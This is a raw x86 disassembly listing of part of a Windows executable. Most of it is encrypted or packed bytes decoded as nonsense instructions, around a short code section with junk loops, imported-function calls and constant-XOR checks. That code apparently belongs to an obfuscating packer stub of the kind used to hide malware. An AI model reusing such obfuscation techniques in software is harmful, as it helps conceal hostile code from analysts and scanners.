  417eaf:	inc    ebx
  417eb0:	pusha  
  417eb1:	mov    ds:0xd3640ddc,al
  417eb7:	add    eax,0xe7cd2100
  417ebc:	fld    QWORD PTR [edi-0x589bb0aa]
  417ec2:	push   esi
  417ec3:	rcl    DWORD PTR [edx-0xa],1
  417ec6:	les    esp,FWORD PTR [eax]
  417ec8:	icebp  
  417ec9:	sahf   
  417eca:	jo     0x417ecc
  417ecc:	inc    edi
  417ecd:	dec    ecx
  417ece:	jecxz  0x417eb7
  417ed0:	push   es
  417ed1:	push   esp
  417ed2:	jns    0x417eca
  417ed4:	or     BYTE PTR [ebp+0x6d],0xf4
  417ed8:	sar    BYTE PTR [ebx+edx*2],cl
  417edb:	push   ecx
  417edc:	jp     0x417e61
  417ede:	mov    ds:0xcd2941f1,al
  417ee3:	cmp    ecx,DWORD PTR [ecx+0x1900d568]
  417ee9:	stos   DWORD PTR es:[edi],eax
  417eea:	in     al,dx
  417eeb:	loope  0x417f6c
  417eed:	icebp  
  417eee:	pop    ss
  417eef:	xchg   ebp,eax
  417ef0:	adc    DWORD PTR [ecx],ebx
  417ef2:	pop    ss
  417ef3:	cdq    
  417ef4:	adc    al,0x14
  417ef6:	dec    esp
  417ef7:	push   0x91de814e
  417efc:	pop    ds
  417efd:	loope  0x417e88
  417eff:	pop    esi
  417f00:	imul   ebp,DWORD PTR [ebx+ebx*4-0x7e],0x88643cc
  417f08:	leave  
  417f09:	adc    edx,DWORD PTR [ebp+0x10]
  417f0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f0d:	sbb    BYTE PTR [ebp-0x5b94a3cf],dl
  417f13:	xchg   ebx,eax
  417f14:	jo     0x417ee2
  417f16:	sbb    ecx,DWORD PTR [ebp-0x55]
  417f19:	xchg   edi,eax
  417f1a:	adc    DWORD PTR [ebp+0x5f71382f],0xf89ef96c
  417f24:	mov    ch,0x27
  417f26:	mov    WORD PTR [edi],?
  417f28:	dec    ecx
  417f29:	and    BYTE PTR [ebx-0x7568b27b],ch
  417f2f:	cmp    eax,0x4c6167a
  417f34:	test   ecx,eax
  417f36:	pop    esi
  417f37:	jge    0x417ef0
  417f39:	mov    al,ds:0xaf5de42d
  417f3e:	mov    dl,0xfe
  417f40:	rcr    BYTE PTR [edx-0x6372ea47],1
  417f46:	adc    ebp,DWORD PTR ds:0xf760eeb
  417f4c:	push   ebx
  417f4d:	cdq    
  417f4e:	sti    
  417f4f:	sar    ch,1
  417f51:	fs aas 
  417f53:	dec    ebp
  417f54:	dec    eax
  417f55:	pop    esi
  417f56:	cwde   
  417f57:	adc    BYTE PTR [edx],dl
  417f59:	dec    edx
  417f5a:	rcr    esp,1
  417f5c:	dec    esp
  417f5d:	dec    ecx
  417f5e:	repnz sub ch,bh
  417f61:	aas    
  417f62:	bound  esi,QWORD PTR [ebp+0x47a08280]
  417f68:	jns    0x417fca
  417f6a:	jae    0x417f6e
  417f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f6d:	out    dx,eax
  417f6e:	xchg   ecx,eax
  417f6f:	cld    
  417f70:	call   0xfa7a9316
  417f75:	push   eax
  417f76:	repnz ins BYTE PTR es:[edi],dx
  417f78:	cld    
  417f79:	xchg   edi,eax
  417f7a:	aas    
  417f7b:	pop    ds
  417f7c:	inc    ebx
  417f7d:	retf   0x66a2
  417f80:	jmp    0x2c9b451a
  417f85:	leave  
  417f86:	sbb    al,0x3
  417f88:	push   edx
  417f89:	cmp    ch,0xae
  417f8c:	adc    BYTE PTR [edx],al
  417f8e:	mov    ds:0xdfd7be41,eax
  417f93:	pop    edi
  417f94:	add    al,0xf8
  417f96:	imul   edx,DWORD PTR [edx],0x4f9ac54e
  417f9c:	and    bh,BYTE PTR [edi]
  417f9e:	sbb    BYTE PTR [esp+ecx*4+0x23],0x38
  417fa3:	pop    edi
  417fa4:	mov    bl,0x1d
  417fa6:	xor    bh,BYTE PTR [ecx]
  417fa8:	mov    edx,0x392104fd
  417fad:	stos   DWORD PTR es:[edi],eax
  417fae:	hlt    
  417faf:	jecxz  0x417fac
  417fb1:	jge    0x417fc1
  417fb3:	mov    WORD PTR [esi-0x4649b65b],fs
  417fb9:	xor    al,BYTE PTR [ebp+0x69eb8dad]
  417fbf:	sub    eax,0x5a05e3e9
  417fc4:	ss mov edi,0x9ab98512
  417fca:	mov    ah,0x54
  417fcc:	aas    
  417fcd:	jl     0x417f8d
  417fcf:	jns    0x417ffe
  417fd1:	xchg   BYTE PTR [ecx],dl
  417fd3:	(bad)  
  417fd4:	stc    
  417fd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fd6:	or     ebx,edx
  417fd8:	push   ss
  417fd9:	imul   DWORD PTR [ebp-0x58]
  417fdc:	jb     0x41801e
  417fde:	cmc    
  417fdf:	pop    edx
  417fe0:	sub    cl,BYTE PTR [eax]
  417fe2:	dec    ebp
  417fe3:	mov    ecx,0x48407992
  417fe8:	stos   BYTE PTR es:[edi],al
  417fe9:	scas   al,BYTE PTR es:[edi]
  417fea:	in     al,dx
  417feb:	sub    eax,0x9656bc6
  417ff0:	fdiv   QWORD PTR [ecx+ebx*8]
  417ff3:	mov    ds:0x9c998899,al
  417ff8:	lds    esp,FWORD PTR [ecx-0x2bcb4d9e]
  417ffe:	iret   
  417fff:	ficomp WORD PTR [esi-0x26f916f8]
  418005:	(bad)  
  418006:	stc    
  418007:	adc    al,0x87
  41800a:	inc    edi
  41800b:	clc    
  41800c:	and    eax,0xe38fba6d
  418011:	loopne 0x41806b
  418013:	jnp    0x418012
  418015:	out    dx,al
  418016:	adc    BYTE PTR [edx],0x86
  418019:	xor    bh,BYTE PTR [eax]
  41801b:	fwait
  41801c:	repz sbb eax,0x46d7fc51
  418022:	addr16 lock jae 0x417fe4
  418026:	inc    ebp
  418027:	jmp    0x418043
  418029:	or     bl,BYTE PTR [ecx-0x413fc1a4]
  41802f:	jecxz  0x417fde
  418031:	adc    ch,dh
  418033:	xor    ch,BYTE PTR [ecx+0x5]
  418036:	aad    0xae
  418038:	repnz sub esi,DWORD PTR ds:0xc422fc63
  41803f:	das    
  418040:	rcr    DWORD PTR [edi],cl
  418042:	sub    eax,0x1023cc45
  418047:	sub    BYTE PTR [edi-0x4b19ca58],0xf5
  41804e:	addr16 sbb ecx,esp
  418051:	adc    BYTE PTR [eax],0xe
  418054:	dec    esi
  418055:	dec    esp
  418056:	inc    ebx
  418057:	adc    eax,DWORD PTR [ecx+0x391fdb81]
  41805d:	and    ebx,DWORD PTR [edi+0x70]
  418060:	call   0x6cd:0x56813e0a
  418067:	xor    DWORD PTR [ebp+0x43],edi
  41806a:	std    
  41806b:	sbb    dh,BYTE PTR [esp+ebx*1+0x151bdb64]
  418072:	lea    esp,[edx-0x48da696]
  418078:	jo     0x41806b
  41807a:	clc    
  41807b:	pop    ss
  41807c:	cmp    BYTE PTR [ebx-0x14bcc511],0x4a
  418083:	rol    BYTE PTR [edi],cl
  418085:	bound  ecx,QWORD PTR [eax]
  418087:	push   eax
  418088:	(bad)  
  418089:	call   0x130992ee
  41808e:	sbb    edx,DWORD PTR [edi+edx*4]
  418091:	cmp    al,0xbd
  418093:	fs inc eax
  418095:	cmp    ch,cl
  418097:	outs   dx,DWORD PTR ds:[esi]
  418098:	dec    edi
  418099:	adc    BYTE PTR [ecx],dl
  41809b:	or     ecx,DWORD PTR [edi-0x7dbd49d3]
  4180a1:	and    eax,0xd95bf5f0
  4180a6:	iret   
  4180a7:	mov    bl,0x5b
  4180a9:	jge    0x418070
  4180ab:	sub    eax,0xf67fe5dd
  4180b0:	cmp    esi,ecx
  4180b2:	mov    ecx,0x71dcc35c
  4180b7:	inc    ebx
  4180b8:	je     0x418114
  4180ba:	je     0x4180ff
  4180bc:	test   al,0xbd
  4180be:	jmp    0x85914f38
  4180c3:	js     0x418143
  4180c5:	and    eax,0xba96b16b
  4180ca:	push   esi
  4180cb:	test   DWORD PTR [eax+0x2f],0x7ea9c2c1
  4180d2:	or     eax,0x3c1ef9f2
  4180d7:	sahf   
  4180d8:	bound  ecx,QWORD PTR [edi-0x7c]
  4180db:	xchg   edx,eax
  4180dc:	push   DWORD PTR [ecx-0x706d2811]
  4180e2:	mov    esi,0x9fce7bab
  4180e7:	popf   
  4180e8:	enter  0xa25c,0x17
  4180ec:	dec    edx
  4180ed:	loope  0x418107
  4180ef:	repnz lds edx,FWORD PTR [ebp-0x4fe0893c]
  4180f6:	jecxz  0x41815a
  4180f8:	pop    es
  4180f9:	or     DWORD PTR [edx-0x2135f537],ebx
  4180ff:	cmp    DWORD PTR [esi],eax
  418101:	mov    ah,0xca
  418103:	ja     0x418154
  418105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418106:	enter  0xbffb,0x9c
  41810a:	(bad)  
  41810b:	rcl    BYTE PTR [esp+eiz*2-0x31246f2],1
  418112:	fmul   QWORD PTR [eax]
  418114:	xchg   ecx,eax
  418115:	xor    cl,bh
  418117:	lods   al,BYTE PTR fs:[esi]
  418119:	mov    esp,0x2048f3c4
  41811e:	pop    eax
  41811f:	cs mov ecx,0xbbec963f
  418125:	sub    ebx,0xf071f236
  41812b:	xor    DWORD PTR [eax],ecx
  41812d:	sbb    al,0x81
  41812f:	and    BYTE PTR [ebp+0x67],dh
  418132:	(bad)  
  418133:	fstp   TBYTE PTR [ecx-0x7d]
  418136:	push   edx
  418137:	les    esp,FWORD PTR [esp+edx*8]
  41813a:	das    
  41813b:	and    BYTE PTR [ecx-0x535ed710],0xdb
  418142:	test   DWORD PTR [edi-0x2c],esi
  418145:	in     al,dx
  418146:	(bad)  
  418147:	pop    ecx
  418148:	push   cs
  418149:	sub    eax,0x2e788a
  41814e:	dec    eax
  41814f:	push   0x3ef5b4ad
  418154:	adc    BYTE PTR [eax-0x64e08537],al
  41815a:	add    eax,0xc2d245e1
  41815f:	enter  0xc45a,0xb3
  418163:	pop    ecx
  418164:	cmp    BYTE PTR [ecx+0x71e3915],cl
  41816a:	call   0xa0f675fa
  41816f:	loope  0x418192
  418171:	je     0x41813b
  418173:	je     0x41814e
  418175:	mov    ecx,0xa12f8ed0
  41817a:	jmp    0x41810c
  41817c:	fmul   st(5),st
  41817e:	sub    BYTE PTR [ebx-0x18],dl
  418181:	fld    DWORD PTR [esi+0x3bf6fc24]
  418187:	xor    dh,bh
  418189:	sbb    al,0xd0
  41818b:	sub    BYTE PTR [edx],0x34
  41818e:	stos   DWORD PTR es:[edi],eax
  41818f:	mov    ecx,0x1db24db6
  418194:	and    al,BYTE PTR [ebx+eax*1-0x6f]
  418198:	inc    ecx
  418199:	pop    edi
  41819a:	cld    
  41819b:	push   ss
  41819c:	adc    eax,0xf0bf6947
  4181a1:	add    DWORD PTR ds:0x7f64428c,esp
  4181a7:	retf   
  4181a8:	push   ecx
  4181a9:	mov    dh,0x44
  4181ab:	popf   
  4181ac:	sahf   
  4181ad:	push   esp
  4181ae:	pop    ds
  4181af:	push   cs
  4181b0:	and    ebx,edi
  4181b2:	push   ss
  4181b3:	adc    esp,ebp
  4181b5:	mov    cl,0xf0
  4181b7:	(bad)
  4181ba:	xchg   dl,ah
  4181bc:	mov    ebp,0x5bcb239d
  4181c1:	pop    ss
  4181c2:	jmp    0x769d47fb
  4181c7:	push   ss
  4181c8:	aaa    
  4181c9:	test   eax,0x8ea6e842
  4181ce:	add    DWORD PTR [ebx],eax
  4181d0:	out    0x8a,eax
  4181d2:	inc    esi
  4181d3:	(bad)  
  4181d4:	sahf   
  4181d5:	xor    BYTE PTR [ecx-0x731ecb24],ch
  4181db:	xor    dh,0x29
  4181de:	sbb    DWORD PTR [ecx+0x49],ecx
  4181e1:	mov    eax,DWORD PTR [ebp-0x14]
  4181e4:	imul   eax,ecx
  4181e7:	add    esp,eax
  4181e9:	xchg   edx,eax
  4181ea:	push   eax
  4181eb:	xor    ebx,ebx
  4181ed:	mov    edx,esp
  4181ef:	dec    edx
  4181f0:	inc    ebx
  4181f1:	add    ebx,DWORD PTR [edx+ebx*1]
  4181f4:	dec    ebx
  4181f5:	xor    edx,edx
  4181f7:	add    DWORD PTR [ebp-0x8],ebx
  4181fa:	pop    ebx
  4181fb:	mov    eax,DWORD PTR [ebp-0x8]
  4181fe:	pop    edi
  4181ff:	pop    esi
  418200:	pop    ebx
  418201:	leave  
  418202:	ret    0x10
  418205:	push   ebp
  418206:	mov    ebp,esp
  418208:	sub    esp,0x14
  41820b:	mov    eax,0xffff2df0
  418210:	inc    ecx
  418211:	mov    DWORD PTR [ebp-0x8],eax
  418214:	mov    DWORD PTR [ebp-0x10],eax
  418217:	movzx  ecx,BYTE PTR ds:0x4267bc
  41821e:	and    ecx,DWORD PTR ds:0x42685c
  418224:	mov    DWORD PTR ds:0x4267bc,ecx
  41822a:	mov    eax,DWORD PTR [ebp-0x4]
  41822d:	xor    DWORD PTR ds:0x42682c,0x1a58
  418237:	mov    ecx,DWORD PTR [ebp-0x4]
  41823a:	adc    DWORD PTR ds:0x4267c4,edi
  418240:	sub    eax,ecx
  418242:	dec    DWORD PTR ds:0x4267b8
  418248:	mov    DWORD PTR [ebp-0x4],eax
  41824b:	mov    DWORD PTR ds:0x426850,0x17
  418255:	cmp    DWORD PTR ds:0x426850,0x0
  41825c:	je     0x4182a9
  418262:	cmp    DWORD PTR ds:0x426850,0x27
  418269:	jbe    0x4182a9
  41826f:	jmp    0x418297
  418274:	push   0x6173
  418279:	push   0x399a
  41827e:	push   0x465d
  418283:	push   DWORD PTR [ebp-0x10]
  418286:	push   DWORD PTR [ebp-0x18]
  418289:	push   DWORD PTR [ebp-0x18]
  41828c:	push   0x4260c9
  418291:	call   DWORD PTR ds:0x4257d4
  418297:	mov    edx,DWORD PTR ds:0x426850
  41829d:	dec    edx
  41829e:	mov    DWORD PTR ds:0x426850,edx
  4182a4:	jmp    0x418255
  4182a9:	push   esi
  4182aa:	mov    DWORD PTR ds:0x426830,0x19
  4182b4:	cmp    DWORD PTR ds:0x426830,0x0
  4182bb:	je     0x418305
  4182c1:	cmp    DWORD PTR ds:0x426830,0x23
  4182c8:	ja     0x418305
  4182ce:	jmp    0x4182f3
  4182d3:	push   0x4267d0
  4182d8:	push   DWORD PTR [ebp-0x20]
  4182db:	push   0x14cd
  4182e0:	push   0x1a05
  4182e5:	push   DWORD PTR [ebp-0x1c]
  4182e8:	push   0x2239
  4182ed:	call   DWORD PTR ds:0x4257d8
  4182f3:	mov    ecx,DWORD PTR ds:0x426830
  4182f9:	dec    ecx
  4182fa:	mov    DWORD PTR ds:0x426830,ecx
  418300:	jmp    0x4182b4
  418305:	mov    DWORD PTR [ebp-0xc],0xce941f82
  41830c:	mov    DWORD PTR [ebp-0x14],0xce941f81
  418313:	xor    eax,eax
  418315:	xor    DWORD PTR [ebp-0x4],0xbd8d95bc
  41831c:	mov    eax,DWORD PTR [ebp-0xc]
  41831f:	mov    ecx,DWORD PTR [ebp-0x8]
  418322:	mov    esi,DWORD PTR [ebp+0x8]
  418325:	mov    edx,0x6729a14b
  41832a:	xor    eax,edx
  41832c:	mov    ecx,0x56424137
  418331:	add    eax,ecx
  418333:	mov    DWORD PTR [esi+0x4],eax
  418336:	mov    eax,DWORD PTR [ebp+0xc]
  418339:	mov    esi,DWORD PTR [ebp+0x8]
  41833c:	mov    DWORD PTR [esi+0x8],eax
  41833f:	mov    eax,DWORD PTR [ebp+0x10]
  418342:	mov    esi,DWORD PTR [ebp+0x8]
  418345:	mov    DWORD PTR [esi+0xc],eax
  418348:	mov    eax,DWORD PTR [ebp+0x14]
  41834b:	mov    esi,DWORD PTR [ebp+0x8]
  41834e:	mov    DWORD PTR [esi+0x10],eax
  418351:	mov    eax,DWORD PTR [ebp-0x4]
  418354:	mov    esi,DWORD PTR [ebp+0x8]
  418357:	xor    eax,0x751018b5
  41835c:	add    eax,0x376272fb
  418361:	mov    DWORD PTR [esi],eax
  418363:	mov    eax,DWORD PTR [ebp-0x14]
  418366:	mov    esi,DWORD PTR [ebp-0x10]
  418369:	xor    eax,edx
  41836b:	add    eax,ecx
  41836d:	pop    esi
  41836e:	leave  
  41836f:	ret    0x10
  418372:	push   ebp
  418373:	mov    ebp,esp
  418375:	push   ecx
  418376:	sub    DWORD PTR ds:0x426834,ecx
  41837c:	push   ecx
  41837d:	adc    DWORD PTR ds:0x4267cc,ebx
  418383:	mov    eax,DWORD PTR [ebp+0x8]
  418386:	and    DWORD PTR ds:0x4267f0,0x0
  418390:	jmp    0x4183a2
  418395:	mov    edx,DWORD PTR ds:0x4267f0
  41839b:	inc    edx
  41839c:	mov    DWORD PTR ds:0x4267f0,edx
  4183a2:	cmp    DWORD PTR ds:0x4267f0,0x10
  4183a9:	jae    0x4183d4
  4183af:	cmp    DWORD PTR ds:0x4267f0,0x1c
  4183b6:	jle    0x4183d4
  4183bc:	jmp    0x4183cf
  4183c1:	push   0x4267e4
  4183c6:	push   DWORD PTR [ebp-0x20]
  4183c9:	call   DWORD PTR ds:0x4257e0
  4183cf:	jmp    0x418395
  4183d4:	mov    DWORD PTR [ebp-0x8],eax
  4183d7:	adc    eax,0x2d32
  4183dc:	mov    eax,DWORD PTR [ebp+0xc]
  4183df:	sub    DWORD PTR ds:0x4267cc,0x338f
  4183e9:	mov    DWORD PTR [ebp-0x4],eax
  4183ec:	adc    edx,DWORD PTR ds:0x426818
  4183f2:	mov    eax,ds:0x426448
  4183f7:	mov    eax,DWORD PTR [eax+0x1c0]
  4183fd:	not    edx
  4183ff:	mov    eax,DWORD PTR [eax]
  418401:	mov    DWORD PTR ds:0x426858,0x11
  41840b:	cmp    DWORD PTR ds:0x426858,0x0
  418412:	je     0x418464
  418418:	cmp    DWORD PTR ds:0x426858,0x9
  41841f:	jb     0x418464
  418425:	jmp    0x418438
  41842a:	push   0x4267e0
  41842f:	push   DWORD PTR [ebp-0x10]
  418432:	call   DWORD PTR ds:0x4257e4
  418438:	cmp    DWORD PTR ds:0x426858,0xa
  41843f:	jne    0x418452
  418445:	mov    edx,DWORD PTR ds:0x426858
  41844b:	dec    edx
  41844c:	mov    DWORD PTR ds:0x426858,edx
  418452:	mov    edx,DWORD PTR ds:0x426858
  418458:	dec    edx
  418459:	mov    DWORD PTR ds:0x426858,edx
  41845f:	jmp    0x41840b
  418464:	push   ebx
  418465:	add    ebx,edx
  418467:	xor    ecx,ecx
  418469:	and    DWORD PTR ds:0x4267c0,0x0
  418473:	jmp    0x418485
  418478:	mov    edx,DWORD PTR ds:0x4267c0
  41847e:	inc    edx
  41847f:	mov    DWORD PTR ds:0x4267c0,edx
  418485:	cmp    DWORD PTR ds:0x4267c0,0x10
  41848c:	jae    0x4184bf
  418492:	cmp    DWORD PTR ds:0x4267c0,0x13
  418499:	jbe    0x4184bf
  41849f:	jmp    0x4184ba
  4184a4:	push   0x4267e8
  4184a9:	push   DWORD PTR [ebp-0x28]
  4184ac:	push   DWORD PTR [ebp-0x14]
  4184af:	push   0x13e8
  4184b4:	call   DWORD PTR ds:0x4257a4
  4184ba:	jmp    0x418478
  4184bf:	push   esi
  4184c0:	add    eax,0xa9bdbec9
  4184c5:	push   edi
  4184c6:	inc    edi
  4184c7:	mov    ebx,0xffffa89a
  4184cc:	mov    DWORD PTR ds:0x4267e4,0x395d
  4184d6:	adc    ecx,ebx
  4184d8:	xor    edx,0x7a00
  4184de:	mov    edi,0x6729a14b
  4184e3:	and    DWORD PTR ds:0x4267e0,0x0
  4184ed:	mov    edx,DWORD PTR ds:0x4267e0
  4184f3:	inc    edx
  4184f4:	mov    DWORD PTR ds:0x4267e0,edx
  4184fa:	cmp    DWORD PTR ds:0x4267e0,0x18
  418501:	jge    0x418522
  418507:	jmp    0x418515
  41850c:	push   DWORD PTR [ebp-0x10]
  41850f:	call   DWORD PTR ds:0x4257a8
  418515:	cmp    DWORD PTR ds:0x4267e0,0x13
  41851c:	jb     0x4184ed
  418522:	mov    esi,0x856a
  418527:	xor    eax,edi
  418529:	mov    edx,0xce941f81
  41852e:	xor    ecx,esi
  418530:	cmp    eax,edx
  418532:	jne    0x418576
  418538:	cmp    ecx,0xffff2df0
  41853e:	jne    0x418576
  418544:	mov    eax,ds:0x4264d4
  418549:	mov    ecx,DWORD PTR ds:0x4264cc
  41854f:	xor    eax,ecx
  418551:	mov    ds:0x4264cc,eax
  418556:	mov    eax,DWORD PTR [ebp+0x18]
  418559:	mov    eax,DWORD PTR [eax]
  41855b:	mov    eax,DWORD PTR [eax]
  41855d:	mov    ecx,DWORD PTR ds:0x4264cc
  418563:	add    DWORD PTR [eax],ecx
  418565:	mov    eax,DWORD PTR [ebp+0x10]
  418568:	mov    DWORD PTR [ebp-0x8],eax
  41856b:	mov    eax,DWORD PTR [ebp+0x14]
  41856e:	mov    DWORD PTR [ebp-0x4],eax
  418571:	jmp    0x4185ab
  418576:	mov    eax,ds:0x4264d4
  41857b:	mov    ecx,DWORD PTR ds:0x4264cc
  418581:	xor    eax,ecx
  418583:	mov    ds:0x4264cc,eax
  418588:	mov    eax,DWORD PTR [ebp+0x18]
  41858b:	mov    eax,DWORD PTR [eax]
  41858d:	mov    ecx,DWORD PTR ds:0x4264cc
  418593:	mov    DWORD PTR [ebp+0x18],eax
  418596:	mov    eax,DWORD PTR [eax]
  418598:	add    ecx,DWORD PTR [eax]
  41859a:	mov    eax,DWORD PTR [ebp+0x18]
  41859d:	mov    eax,DWORD PTR [eax]
  41859f:	mov    DWORD PTR [eax],ecx
  4185a1:	mov    DWORD PTR [ebp-0x8],edx
  4185a4:	mov    DWORD PTR [ebp-0x4],0xffff2df0
  4185ab:	mov    eax,DWORD PTR [ebp-0x8]
  4185ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4185b1:	cmp    eax,edx
  4185b3:	jne    0x4185f7
  4185b9:	cmp    ecx,0xffff2df0
  4185bf:	jne    0x4185f7
  4185c5:	mov    eax,ds:0x4264cc
  4185ca:	mov    edx,DWORD PTR [ebp+0x8]
  4185cd:	xor    ecx,ecx
  4185cf:	add    eax,0xa9bdbec9
  4185d4:	adc    ecx,ebx
  4185d6:	xor    eax,edi
  4185d8:	xor    ecx,esi
  4185da:	mov    esi,DWORD PTR [ebp+0xc]
  4185dd:	cmp    eax,edx
  4185df:	jne    0x4185f7
  4185e5:	cmp    ecx,esi
  4185e7:	jne    0x4185f7
  4185ed:	mov    eax,ds:0x4264cc
  4185f2:	mov    ds:0x4264d4,eax
  4185f7:	pop    edi
  4185f8:	pop    esi
  4185f9:	pop    ebx
  4185fa:	leave  
  4185fb:	ret    0x14
  4185fe:	push   ebp
  4185ff:	mov    ebp,esp
  418601:	sub    esp,0x80
  418607:	and    eax,DWORD PTR ds:0x4267e4
  41860d:	mov    eax,ds:0x426448
  418612:	adc    ecx,DWORD PTR ds:0x4267b4
  418618:	mov    DWORD PTR [ebp-0x28],eax
  41861b:	mov    eax,ds:0x426568
  418620:	mov    DWORD PTR [ebp-0x2c],eax
  418623:	jmp    0x41a98b
  418628:	pop    esp
  418629:	aad    0x7c
  41862b:	dec    ebx
  41862c:	xor    al,0x52
  41862e:	ins    BYTE PTR es:[edi],dx
  41862f:	hlt    
  418630:	xchg   edi,eax
  418631:	das    
  418632:	mov    bl,0xc0
  418634:	dec    eax
  418635:	xchg   ebx,eax
  418636:	mov    esp,0x7ada57c0
  41863b:	jnp    0x4185fd
  41863d:	cwde   
  41863e:	jnp    0x4186bb
  418640:	dec    esi
  418641:	mov    esp,0xa835ee83
  418646:	iret   
  418647:	cmp    BYTE PTR [eax],dl
  418649:	test   eax,0x4b213b62
  41864e:	and    edx,DWORD PTR [ebp+eax*1-0x2725cdd4]
  418655:	push   es
  418656:	int    0xcc
  418658:	xlat   BYTE PTR ds:[ebx]
  418659:	xor    al,0x56
  41865c:	add    al,0xee
  41865e:	lods   eax,DWORD PTR ds:[esi]
  41865f:	dec    ecx
  418660:	push   es
  418661:	lock mov ds:0x3a08d09a,al
  418667:	call   0x270a:0xb040c240
  41866e:	daa    
  41866f:	mov    dl,0x37
  418671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418672:	push   ebx
  418673:	fidiv  DWORD PTR [edi+0x1b]
  418676:	ja     0x4186f5
  418678:	and    al,0xa9
  41867a:	add    BYTE PTR gs:[eax+0x3f],bl
  41867e:	mov    edi,0xd09229e8
  418683:	lods   eax,DWORD PTR ds:[esi]
  418684:	test   DWORD PTR [eax],ecx
  418686:	mov    ebp,0xb8695266
  41868b:	xchg   DWORD PTR [ebp+0x51],ecx
  41868e:	jp     0x41863e
  418690:	ds mov ah,0x9d
  418693:	mov    ds:0x716c6a31,eax
  418698:	cli    
  418699:	adc    DWORD PTR [eax-0x14078bd6],ebp
  41869f:	pop    esp
  4186a0:	sbb    DWORD PTR [esi+esi*8],ebp
  4186a3:	add    al,0x23
  4186a5:	rcr    DWORD PTR [ecx+0x1a],cl
  4186a8:	fdiv   st,st(1)
  4186aa:	mov    bh,0x8e
  4186ac:	jne    0x4186fc
  4186ae:	sbb    eax,0x30a46c04
  4186b3:	xor    eax,0x7d4bba68
  4186b8:	sub    DWORD PTR [edi-0x5033703b],eax
  4186be:	lods   al,BYTE PTR ds:[esi]
  4186bf:	shr    DWORD PTR ds:0x7295b225,cl
  4186c5:	cmp    eax,0xb18dee8e
  4186ca:	psrld  mm3,QWORD PTR [ebx+eax*8]
  4186ce:	xor    cl,dl
  4186d0:	dec    edx
  4186d1:	add    eax,0xa7a17b0e
  4186d6:	in     eax,dx
  4186d7:	mov    ds:0x39d3b8e7,eax
  4186dc:	add    dh,BYTE PTR [edx+0x20]
  4186df:	jle    0x4186f6
  4186e1:	xor    DWORD PTR [edi+0x47],ebx
  4186e4:	mov    edx,?
  4186e6:	scas   al,BYTE PTR es:[edi]
  4186e7:	cdq    
  4186e8:	pop    esp
  4186e9:	ror    BYTE PTR [edx],0x55
  4186ec:	adc    edx,ecx
  4186ee:	xchg   esi,eax
  4186ef:	mov    al,ds:0x5cd8f572
  4186f4:	imul   ecx,DWORD PTR [esi],0x26
  4186f7:	shr    BYTE PTR [edx],cl
  4186f9:	sub    BYTE PTR [ebx],dl
  4186fb:	aaa    
  4186fc:	jne    0x418775
  4186fe:	lock sub BYTE PTR ds:0xd17f66e2,cl
  418705:	fiadd  WORD PTR [ebx+0x5a55277b]
  41870b:	jae    0x418703
  41870d:	pusha  
  41870e:	stos   DWORD PTR es:[edi],eax
  41870f:	ja     0x4186a8
  418711:	mov    ch,0x44
  418713:	(bad)  
  418714:	push   0x47
  418716:	mov    edi,0xcee710a9
  41871b:	stos   BYTE PTR es:[edi],al
  41871c:	inc    edx
  41871d:	xor    DWORD PTR [eax-0x20],esp
  418720:	scas   eax,DWORD PTR es:[edi]
  418721:	xchg   ebx,eax
  418722:	out    dx,al
  418723:	je     0x4186b7
  418725:	dec    ecx
  418726:	xchg   DWORD PTR [esi],eax
  418728:	or     ecx,DWORD PTR [ecx+ebp*1+0x47]
  41872c:	mov    edi,0x75a546e6
  418731:	dec    ebx
  418732:	dec    ebx
  418733:	cwde   
  418734:	xor    al,0x4
  418736:	mov    cl,0x30
  418738:	cmp    BYTE PTR [esi+edx*4],dh
  41873b:	cmp    eax,0x25dd15ad
  418740:	js     0x4186e3
  418742:	mov    BYTE PTR [ecx+0xb],ch
  418745:	iret   
  418746:	arpl   WORD PTR [eax-0x26ca8a80],ax
  41874c:	ins    DWORD PTR es:[edi],dx
  41874d:	jl     0x41870c
  41874f:	cdq    
  418750:	rol    DWORD PTR [ebx+0x68],cl
  418753:	ret    0xf747
  418756:	(bad)  
  418757:	jg     0x4187c1
  418759:	jp     0x4187c0
  41875b:	fdiv   st,st(3)
  41875d:	imul   ebx,DWORD PTR cs:[edx+0x41],0x7c
  418762:	sbb    edx,DWORD PTR [edi+0x7876b33e]
  418768:	bound  ebx,QWORD PTR es:[edx-0x58d3f9dd]
  41876f:	gs xor al,0x3e
  418772:	mov    al,ds:0x9b060ebf
  418777:	pop    edx
  418778:	sahf   
  418779:	jbe    0x4187d7
  41877b:	(bad)  
  41877c:	out    dx,eax
  41877d:	push   esp
  41877e:	jmp    FWORD PTR [edx+0x1a]
  418781:	mov    BYTE PTR [edx+0x4ad34857],bl
  418787:	ins    DWORD PTR es:[edi],dx
  418788:	xor    DWORD PTR [esi+eiz*8],ecx
  41878b:	icebp  
  41878c:	add    al,0x1e
  41878e:	leave  
  41878f:	xchg   ebx,eax
  418790:	mov    esp,0xc3826a1
  418795:	arpl   WORD PTR [ebp-0x30],bx
  418798:	repz (bad) 
  41879b:	jg     0x418798
  41879d:	add    BYTE PTR [eax],bl
  41879f:	adc    DWORD PTR [edi+0x7a],eax
  4187a2:	into   
  4187a3:	push   eax
  4187a4:	sub    bl,ah
  4187a6:	cmp    esi,0xd
  4187a9:	adc    eax,0xbc289d34
  4187ae:	mov    cl,0x3b
  4187b0:	sbb    DWORD PTR [ebx+0x24c727e5],ebx
  4187b6:	add    cl,dl
  4187b8:	pusha  
  4187b9:	add    al,0xb1
  4187bb:	aam    0x2a
  4187bd:	retf   0x6a8f
  4187c0:	jne    0x418818
  4187c2:	sbb    eax,0x5af376c0
  4187c7:	enter  0xeffc,0x32
  4187cb:	pop    ecx
  4187cc:	out    dx,eax
  4187cd:	aam    0xe2
  4187cf:	sub    edx,DWORD PTR [ecx+0x4c]
  4187d2:	or     ecx,DWORD PTR [ecx]
  4187d4:	pop    esi
  4187d5:	jo     0x41876c
  4187d7:	out    0x62,al
  4187d9:	ror    ecx,cl
  4187db:	jmp    0x418765
  4187dd:	inc    edi
  4187de:	sub    al,0x54
  4187e0:	xchg   ecx,eax
  4187e1:	sbb    eax,0xbd84d27d
  4187e6:	popa   
  4187e7:	shl    ebp,0xde
